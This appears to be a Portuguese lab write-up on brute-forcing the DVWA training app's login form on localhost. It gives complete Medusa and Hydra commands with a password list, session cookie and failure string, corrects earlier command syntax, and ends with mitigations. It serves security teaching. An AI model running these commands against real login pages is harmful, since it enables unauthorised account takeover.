# 04 — Força Bruta em Formulário Web (DVWA)

Automatizar tentativas de login em uma aplicação web vulnerável (DVWA) com
**Medusa** e **Hydra**.

## 4.1 Medusa (módulo web-form)

```bash
medusa -u admin -P pass.txt -h 127.0.0.1 \
-M web-form \
-m FORM:"/dvwa/vulnerabilities/brute/" \
-m DENY-SIGNAL:"Username and/or password incorrect." \
-m form-data:'username=^USER^&password=^PASS^&Login=Login' \
-m CUSTOM-HEADER:"Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774"
```

> ⚠️ **Correção:** o parâmetro original era `-m form-data:'get?username=&password=&Login=Login'`,
> o que indicava uma URL GET. O módulo `web-form` do Medusa envia dados via **POST**,
> então o body correto traz os placeholders `^USER^` e `^PASS^`:
>
> ```bash
> -m form-data:'username=^USER^&password=^PASS^&Login=Login'
> ```

| Flag | Significado |
|------|-------------|
| `-u admin` | Usuário fixo a ser testado |
| `-P pass.txt` | Lista de senhas |
| `-M web-form` | Módulo web-form |
| `-m FORM:"..."` | Endpoint do DVWA (`/dvwa/vulnerabilities/brute/`) |
| `-m DENY-SIGNAL:"..."` | String de erro que indica falha de login |
| `-m form-data:'...'` | Body do POST (com `^USER^` e `^PASS^` como placeholders) |
| `-m CUSTOM-HEADER:"..."` | Cabeçalho personalizado (sessão PHP do DVWA) |

## 4.2 Hydra (http-get-form)

```bash
hydra -l admin -P pass.txt 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':F=Username and/or password incorrect."
```

> ⚠️ **Correção:** o cabeçalho `H=Cookie: PHPSESSID=...;security=low` continha um `;`,
> que o Hydra interpretava como separador de opções. Com as aspas, o valor ficou
> agrupado:
>
> ```bash
> H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low'
> ```

| Flag | Significado |
|------|-------------|
| `-l admin` | Usuário fixo |
| `-P pass.txt` | Lista de senhas |
| `http-get-form` | Método HTTP + formulário |
| `/dvwa/vulnerabilities/brute/` | Endpoint do DVWA |
| `username=^USER^&password=^PASS^&Login=Login` | Campos do formulário |
| `H='...'` | Cabeçalhos (com `;` agrupado) |
| `F=...` | String de falha (login incorreto) |

## Resultado

- Credenciais válidas aparecem na saída;
- Senhas não encontradas: saída vazia ou mensagem de erro.

## Mitigação

- Rate limiting no endpoint de login;
- Lockout de conta após N tentativas;
- MFA;
- Mensagens de erro genéricas;
- Validação e sanitização de entrada.
